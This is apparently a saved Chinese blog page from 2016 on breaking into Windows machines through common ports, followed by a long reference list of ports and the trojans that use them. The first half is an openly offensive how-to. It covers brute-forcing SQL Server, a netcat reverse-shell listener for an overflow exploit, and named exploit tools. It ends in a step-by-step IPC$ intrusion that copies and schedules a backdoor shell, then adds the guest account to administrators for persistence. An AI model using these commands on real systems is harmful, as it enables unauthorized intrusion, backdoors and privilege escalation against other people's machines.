@@ -1,0 +1,780 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN">
+
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<title>
+    Windows下一些常見端口的侵入 &laquo; ___道子千秋
+</title>
+<link rel="stylesheet" href="http://blog.whatisit.cn/wp-content/themes/ink-and-wash/style.css" type="text/css" media="screen" />
+<link title="RSS 2.0" type="application/rss+xml" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?feed=rss2" rel="alternate" />
+<!--[if IE 6]>
+<script type="text/javascript" src="http://blog.whatisit.cn/wp-content/themes/ink-and-wash/js/DD_belatedPNG.js"></script>
+<script>DD_belatedPNG.fix('.nav li,.searchsm'); </script> 
+<![endif]-->
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="韻秋小道童 &raquo; Windows下一些常見端口的侵入评论Feed" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?feed=rss2&#038;p=1082" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/blog.whatisit.cn\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.1"}};
+			!function(a,b,c){function d(a){var c,d,e,f,g,h=b.createElement("canvas"),i=h.getContext&&h.getContext("2d"),j=String.fromCharCode;if(!i||!i.fillText)return!1;switch(i.textBaseline="top",i.font="600 32px Arial",a){case"flag":return i.fillText(j(55356,56806,55356,56826),0,0),!(h.toDataURL().length<3e3)&&(i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,65039,8205,55356,57096),0,0),c=h.toDataURL(),i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,55356,57096),0,0),d=h.toDataURL(),c!==d);case"diversity":return i.fillText(j(55356,57221),0,0),e=i.getImageData(16,16,1,1).data,f=e[0]+","+e[1]+","+e[2]+","+e[3],i.fillText(j(55356,57221,55356,57343),0,0),e=i.getImageData(16,16,1,1).data,g=e[0]+","+e[1]+","+e[2]+","+e[3],f!==g;case"simple":return i.fillText(j(55357,56835),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode8":return i.fillText(j(55356,57135),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode9":return i.fillText(j(55358,56631),0,0),0!==i.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity","unicode9"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='https://api.w.org/' href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/?rest_route=/' />
+<link rel='prev' title='荷兰少年Boyan Slat' href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1078/index.html' />
+<link rel='next' title='解决用U盘安装Linux时候出现cd-rom无法挂载' href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1084/index.html' />
+<meta name="generator" content="WordPress 4.6.1 - really-static 0.5" />
+<link rel="canonical" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1082/index.html" />
+<link rel="alternate" type="application/json+oembed" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fblog.whatisit.cn%2Fwp-content%2Fplugins%2Freally-static%2Fstatic%2Fp%3D1082%2Findex.html" />
+<link rel="alternate" type="text/xml+oembed" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fblog.whatisit.cn%2Fwp-content%2Fplugins%2Freally-static%2Fstatic%2Fp%3D1082%2Findex.html&#038;format=xml" />
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		</head>
+
+<body itemtype="http://schema.org/WebPage" itemscope="">
+
+   <div id="fullwrapper">
+       <div class="wrap">
+           <div class="header">
+               <div class="logo"><p><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/"><font size="8" face="KaiTi">韻秋小道童</font></a></p><font size="5" face="KaiTi">被玩壞的小道童</font></div>
+               	 <ul class="nav">
+                 		<li><a title="首页" href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/">首页</a></li>
+                 		<li><a title="江湖故事" href="/jhgs-html/">江湖故事</a></li>
+	<li class="page_item page-item-870"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=870/index.html">IT便利貼</a></li>
+<li class="page_item page-item-837"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=837/index.html">江湖故事</a></li>
+<li class="page_item page-item-9"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=9/index.html">我的微博</a></li>
+<li class="page_item page-item-47"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=47/index.html">自省三聲</a></li>
+                </ul>
+           </div>
+       </div>
+       <div class="wrap">	<div id="content" class="widecolumn" role="main">
+		<div class="content_top conleft"></div>
+	
+		<div class="post-1082 post type-post status-publish format-standard hentry category-safe-for-network" id="post-1082">
+			<h2>Windows下一些常見端口的侵入</h2>
+				<div class="post_intro">
+					<span>tydqq Post in <a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=13/index.html" rel="category">Safe for Network</a>，</span>
+									</div>
+				<div class="content_date">
+					<div class="datebg">
+						<span class="day">05</span>
+						<span>一月</span>
+						<span>2016</span>
+					</div>
+				</div>
+				<div class="comments">
+					<span class="cmt_num"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1082/index.html#respond">0</a></span>
+				</div>
+				
+			<div class="entry">
+				<p style="color: #969696; padding-left: 30px;">1. 1433端口入侵 <wbr /> <wbr /></p>
+<p>scanport.exe 查有1433的机器 <wbr /> <wbr /></p>
+<p>SQLScanPass.exe 进行字典暴破（字典是关键） <wbr /> <wbr /><br />
+<span id="more-1082"></span></p>
+<p>最后 SQLTools.exe入侵 <wbr /> <wbr /></p>
+<p>对sql的sp2及以下的系统，可用sql的hello 溢出漏洞入侵。 <wbr /> <wbr /></p>
+<p>nc -vv -l -p 本机端口 sqlhelloF.exe 入侵ip 1433 本机ip 本机端口 <wbr /> <wbr /></p>
+<p>（以上反向的，测试成功） <wbr /> <wbr /></p>
+<p>sqlhelloz.exe 入侵ip 1433 （这个是正向连接） <wbr /> <wbr /></p>
+<p>2. 4899端口入侵 <wbr /> <wbr /></p>
+<p>用4899过滤器.exe，扫描空口令的机器 <wbr /> <wbr /></p>
+<p>3. 3899的入侵 <wbr /> <wbr /></p>
+<p>对很早的机器，可以试试3389的溢出(win3389ex.exe) <wbr /> <wbr /></p>
+<p>对2000的机器，可以试试字典暴破。(tscrack.exe) <wbr /> <wbr /></p>
+<p>4. 80入侵 <wbr /> <wbr /></p>
+<p>对sp3以前的机器，可以用webdav入侵； <wbr /> <wbr /></p>
+<p>对bbs论坛，可以试试上传漏洞（upfile.exe或dvup_delphi.exe） <wbr /> <wbr /></p>
+<p>可以利用SQL进行注入。（啊D的注入软件）。 <wbr /> <wbr /></p>
+<p>5. serv-u入侵(21端口） <wbr /> <wbr /></p>
+<p>对5. 004及以下系统，可用溢出入侵。（serv5004.exe） <wbr /> <wbr /></p>
+<p>对5.1.0.0及以下系统，可用本地提升权限。（servlocal.exe） <wbr /> <wbr /></p>
+<p>对serv-u的MD5加密密码，可以用字典暴破。（crack.vbs） <wbr /> <wbr /></p>
+<p>输入一个被serv-u加密的密码（34位长），通过与字典档（dict.txt）的比较，得到密码 <wbr /> <wbr /></p>
+<p>6. 554端口 <wbr /> <wbr /></p>
+<p>用real554.exe入侵。 <wbr /> <wbr /></p>
+<p>7. 6129端口 <wbr /> <wbr /></p>
+<p>用DameWare6129.exe入侵。 <wbr /> <wbr /></p>
+<p>8. 系统漏洞 <wbr /> <wbr /></p>
+<p>利用135、445端口，用ms03026、ms03039、ms03049、ms04011漏洞， <wbr /> <wbr /></p>
+<p>进行溢出入侵。 <wbr /> <wbr /></p>
+<p>9. 3127等端口 <wbr /> <wbr /></p>
+<p>可以利用doom病毒开的端口，用nodoom.exe入侵。（可用mydoomscan.exe查）。 <wbr /> <wbr /></p>
+<p>10. 其他入侵 <wbr /> <wbr /></p>
+<p>利用shanlu的入侵软件入侵（WINNTAutoAttack.exe）。 <wbr /> <wbr /></p>
+<p>经典IPC$入侵 <wbr /> <wbr /></p>
+<p>1. C:\&gt;net use $&#8221;&gt;\\127.0.0.1\IPC$ &#8220;&#8221; /user:&#8221;admintitrators&#8221; <wbr /> <wbr /></p>
+<p>这是用&#8221;流光&#8221;扫到的用户名是administrators，密码为&#8221;空&#8221;的IP地址(气好到家如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连 <wbr /> <wbr /></p>
+<p>接，因为密码为&#8221;空&#8221;，所以第一个引号处就不用输入，后面一个双引号里的是用户名 <wbr /> <wbr /></p>
+<p>，输入administrators，命令即可成功完成。 <wbr /> <wbr /></p>
+<p>2. C:\&gt;copy srv.exe $&#8221;&gt;\\127.0.0.1\admin$ <wbr /> <wbr /></p>
+<p>先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的 <wbr /> <wbr /></p>
+<p>c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。 <wbr /> <wbr /></p>
+<p>3. C:\&gt;net time \\127.0.0.1 <wbr /> <wbr /></p>
+<p>查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。 <wbr /> <wbr /></p>
+<p>4. C:\&gt;at \\127.0.0.1 11:05 srv.exe <wbr /> <wbr /></p>
+<p>用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊. <wbr /> <wbr /></p>
+<p>5. C:\&gt;net time \\127.0.0.1 <wbr /> <wbr /></p>
+<p>再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备 <wbr /> <wbr /></p>
+<p>开始下面的命令。 <wbr /> <wbr /></p>
+<p>6. C:\&gt;telnet 127.0.0.1 99 <wbr /> <wbr /></p>
+<p>这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的 <wbr /> <wbr /></p>
+<p>是SRV在对方计算机中为我们建立一个99端口的Shell。 <wbr /> <wbr /></p>
+<p>虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打 <wbr /> <wbr /></p>
+<p>算建立一个Telnet服务！这就要用到ntlm了 <wbr /> <wbr /></p>
+<p>7.C:\&gt;copy ntlm.exe $&#8221;&gt;\\127.0.0.1\admin$ <wbr /> <wbr /></p>
+<p>用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。 <wbr /> <wbr /></p>
+<p>8. C:\WINNT\system32&gt;ntlm <wbr /> <wbr /></p>
+<p>输入ntlm启动（这里的C:\WINNT\system32&gt;指的是对方计算机，运行ntlm其实是让这 <wbr /> <wbr /></p>
+<p>个程序在对方计算机上运行）。当出现&#8221;DONE&#8221;的时候，就说明已经启动正常。然后使 <wbr /> <wbr /></p>
+<p>用&#8221;net start telnet&#8221;来开启Telnet服务！ <wbr /> <wbr /></p>
+<p>9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作 <wbr /> <wbr /></p>
+<p>一样简单！(然后你想做什么?想做什么就做什么吧,哈哈) <wbr /> <wbr /></p>
+<p>为了以防万一,我们再把guest激活加到管理组 <wbr /> <wbr /></p>
+<p>10. C:\&gt;net user guest /active:yes <wbr /> <wbr /></p>
+<p>将对方的Guest用户激活 <wbr /> <wbr /></p>
+<p>11. C:\&gt;net user guest 1234 <wbr /> <wbr /></p>
+<p>将Guest的密码改为1234,或者你要设定的密码 <wbr /> <wbr /></p>
+<p>12. C:\&gt;net localgroup administrators guest /add <wbr /> <wbr /></p>
+<p>将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我 <wbr /> <wbr /></p>
+<p>们可以用guest再次访问这台计算机)</p>
+<p style="color: #969696; padding-left: 30px;"> <wbr /></p>
+<p style="color: #969696; padding-left: 30px;">各种端口详解</p>
+<p style="color: #969696; padding-left: 30px;">端口：0<br />
+服务：Reserved<br />
+说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：1<br />
+服务：tcpmux<br />
+说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。<br />
+端口：7<br />
+服务：Echo<br />
+说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。<br />
+端口：19<br />
+服务：Character Generator<br />
+说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。<br />
+端口：21<br />
+服务：FTP<br />
+说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。<br />
+端口：22<br />
+服务：Ssh<br />
+说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。<br />
+端口：23<br />
+服务：Telnet<br />
+说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。<br />
+端口：25</p>
+<p style="color: #969696; padding-left: 30px;">服务：SMTP<br />
+说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。<br />
+端口：31<br />
+服务：MSG Authentication<br />
+说明：木马Master Paradise、Hackers Paradise开放此端口。<br />
+端口：42<br />
+服务：WINS Replication<br />
+说明：WINS复制<br />
+端口：53<br />
+服务：Domain Name Server（DNS）<br />
+说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。<br />
+端口：67<br />
+服务：Bootstrap Protocol Server<br />
+说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。<br />
+端口：69<br />
+服务：Trival File Transfer<br />
+说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何文件。它们也可用于系统写入文件。<br />
+端口：79<br />
+服务：Finger Server<br />
+说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。<br />
+端口：80<br />
+服务：HTTP<br />
+说明：用于网页浏览。木马Executor开放此端口。<br />
+端口：99<br />
+服务：Metagram Relay<br />
+说明：后门程序ncx99开放此端口。<br />
+端口：102<br />
+服务：Message transfer agent(MTA)-X.400 over TCP/IP<br />
+说明：消息传输代理。</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：109<br />
+服务：Post Office Protocol -Version3<br />
+说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3</p>
+<p style="color: #969696; padding-left: 30px;">服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。<br />
+端口：110<br />
+服务：SUN公司的RPC服务所有端口<br />
+说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等<br />
+端口：113<br />
+服务：Authentication Service<br />
+说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。<br />
+端口：119<br />
+服务：Network News Transfer Protocol<br />
+说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p>
+<p style="color: #969696; padding-left: 30px;">端口：135<br />
+服务：Location Service<br />
+说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。<br />
+端口：137、138、139<br />
+服务：NETBIOS Name Service<br />
+说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。<br />
+端口：143<br />
+服务：Interim Mail Access Protocol v2<br />
+说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。<br />
+端口：161<br />
+服务：SNMP<br />
+说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p>
+<p style="color: #969696; padding-left: 30px;">端口：177</p>
+<p style="color: #969696; padding-left: 30px;">服务：X Display Manager Control Protocol<br />
+说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。<br />
+端口：389<br />
+服务：LDAP、ILS<br />
+说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。<br />
+端口：443<br />
+服务：Https<br />
+说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。<br />
+端口：456<br />
+服务：[NULL]<br />
+说明：木马HACKERS PARADISE开放此端口。<br />
+端口：513<br />
+服务：Login,remote login<br />
+说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。<br />
+端口：544<br />
+服务：[NULL]<br />
+说明：kerberos kshell<br />
+端口：548<br />
+服务：Macintosh,File Services(AFP/IP)<br />
+说明：Macintosh,文件服务。<br />
+端口：553<br />
+服务：CORBA IIOP （UDP）<br />
+说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p>
+<p style="color: #969696; padding-left: 30px;">端口：555<br />
+服务：DSF<br />
+说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。<br />
+端口：568<br />
+服务：Membership DPA<br />
+说明：成员资格 DPA。<br />
+端口：569<br />
+服务：Membership MSN<br />
+说明：成员资格 MSN。<br />
+端口：635<br />
+服务：mountd<br />
+说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。<br />
+端口：636<br />
+服务：LDAP<br />
+说明：SSL（Secure Sockets layer）</p>
+<p style="color: #969696; padding-left: 30px;">端口：666<br />
+服务：Doom Id Software<br />
+说明：木马Attack FTP、Satanz Backdoor开放此端口<br />
+端口：993<br />
+服务：IMAP<br />
+说明：SSL（Secure Sockets layer）<br />
+端口：1001、1011<br />
+服务：[NULL]<br />
+说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：1024<br />
+服务：Reserved<br />
+说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。<br />
+端口：1025、1033<br />
+服务：1025：network blackjack 1033：[NULL]<br />
+说明：木马netspy开放这2个端口。<br />
+端口：1080<br />
+服务：SOCKS<br />
+说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br />
+端口：1170<br />
+服务：[NULL]<br />
+说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。<br />
+端口：1234、1243、6711、6776<br />
+服务：[NULL]<br />
+说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：1245<br />
+服务：[NULL]<br />
+说明：木马Vodoo开放此端口。<br />
+端口：1433<br />
+服务：SQL<br />
+说明：Microsoft的SQL服务开放的端口。<br />
+端口：1492<br />
+服务：stone-design-1<br />
+说明：木马FTP99CMP开放此端口。<br />
+端口：1500<br />
+服务：RPC client fixed port session queries</p>
+<p style="color: #969696; padding-left: 30px;">
+说明：RPC客户固定端口会话查询<br />
+端口：1503<br />
+服务：NetMeeting T.120<br />
+说明：NetMeeting T.120<br />
+端口：1524<br />
+服务：ingress<br />
+说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。<br />
+端口：1600<br />
+服务：issd<br />
+说明：木马Shivka-Burka开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：1720<br />
+服务：NetMeeting<br />
+说明：NetMeeting H.233 call Setup。<br />
+端口：1731<br />
+服务：NetMeeting Audio Call Control<br />
+说明：NetMeeting音频调用控制。<br />
+端口：1807<br />
+服务：[NULL]<br />
+说明：木马SpySender开放此端口。<br />
+端口：1981<br />
+服务：[NULL]<br />
+说明：木马ShockRave开放此端口。<br />
+端口：1999<br />
+服务：cisco identification port<br />
+说明：木马BackDoor开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：2000<br />
+服务：[NULL]<br />
+说明：木马GirlFriend 1.3、Millenium 1.0开放此端口。<br />
+端口：2001<br />
+服务：[NULL]<br />
+说明：木马Millenium 1.0、Trojan Cow开放此端口。<br />
+端口：2023<br />
+服务：xinuexpansion 4<br />
+说明：木马Pass Ripper开放此端口。<br />
+端口：2049<br />
+服务：NFS<br />
+说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。<br />
+端口：2115</p>
+<p style="color: #969696; padding-left: 30px;">服务：[NULL]<br />
+说明：木马Bugs开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：2140、3150<br />
+服务：[NULL]<br />
+说明：木马Deep Throat 1.0/3.0开放此端口。<br />
+端口：2500<br />
+服务：RPC client using a fixed port session replication<br />
+说明：应用固定端口会话复制的RPC客户<br />
+端口：2583<br />
+服务：[NULL]<br />
+说明：木马Wincrash 2.0开放此端口。<br />
+端口：2801<br />
+服务：[NULL]<br />
+说明：木马Phineas Phucker开放此端口。<br />
+端口：3024、4092<br />
+服务：[NULL]<br />
+说明：木马WinCrash开放此端口。<br />
+端口：3128<br />
+服务：squid<br />
+说明：这是squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。<br />
+端口：3129<br />
+服务：[NULL]<br />
+说明：木马Master Paradise开放此端口。<br />
+端口：3150<br />
+服务：[NULL]<br />
+说明：木马The Invasor开放此端口。<br />
+端口：3210、4321<br />
+服务：[NULL]<br />
+说明：木马SchoolBus开放此端口</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：3333<br />
+服务：dec-notes<br />
+说明：木马Prosiak开放此端口<br />
+端口：3389<br />
+服务：超级终端<br />
+说明：WINDOWS 2000终端开放此端口。<br />
+端口：3700<br />
+服务：[NULL]</p>
+<p style="color: #969696; padding-left: 30px;">
+说明：木马Portal of Doom开放此端口<br />
+端口：3996、4060<br />
+服务：[NULL]<br />
+说明：木马RemoteAnything开放此端口<br />
+端口：4000<br />
+服务：QQ客户端<br />
+说明：腾讯QQ客户端开放此端口。<br />
+端口：4092<br />
+服务：[NULL]<br />
+说明：木马WinCrash开放此端口。<br />
+端口：4590<br />
+服务：[NULL]<br />
+说明：木马ICQTrojan开放此端口。<br />
+端口：5000、5001、5321、50505 服务：[NULL]<br />
+说明：木马blazer5开放5000端口。木马Sockets de Troie开放5000、5001、5321、50505端口。<br />
+端口：5400、5401、5402<br />
+服务：[NULL]<br />
+说明：木马Blade Runner开放此端口。<br />
+端口：5550<br />
+服务：[NULL]<br />
+说明：木马xtcp开放此端口。<br />
+端口：5569<br />
+服务：[NULL]<br />
+说明：木马Robo-Hack开放此端口。<br />
+端口：5632<br />
+服务：pcAnywere<br />
+说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：5742<br />
+服务：[NULL]<br />
+说明：木马WinCrash1.03开放此端口。<br />
+端口：6267<br />
+服务：[NULL]<br />
+说明：木马广外女生开放此端口。<br />
+端口：6400<br />
+服务：[NULL]<br />
+说明：木马The tHing开放此端口。<br />
+端口：6670、6671<br />
+服务：[NULL]</p>
+<p style="color: #969696; padding-left: 30px;">
+说明：木马Deep Throat开放6670端口。而Deep Throat 3.0开放6671端口。<br />
+端口：6883<br />
+服务：[NULL]<br />
+说明：木马DeltaSource开放此端口。<br />
+端口：6969<br />
+服务：[NULL]<br />
+说明：木马Gatecrasher、Priority开放此端口。<br />
+端口：6970<br />
+服务：RealAudio<br />
+说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。<br />
+端口：7000<br />
+服务：[NULL]<br />
+说明：木马Remote Grab开放此端口。<br />
+端口：7300、7301、7306、7307、7308<br />
+服务：[NULL]<br />
+说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：7323<br />
+服务：[NULL]<br />
+说明：Sygate服务器端。<br />
+端口：7626<br />
+服务：[NULL]<br />
+说明：木马Giscier开放此端口。<br />
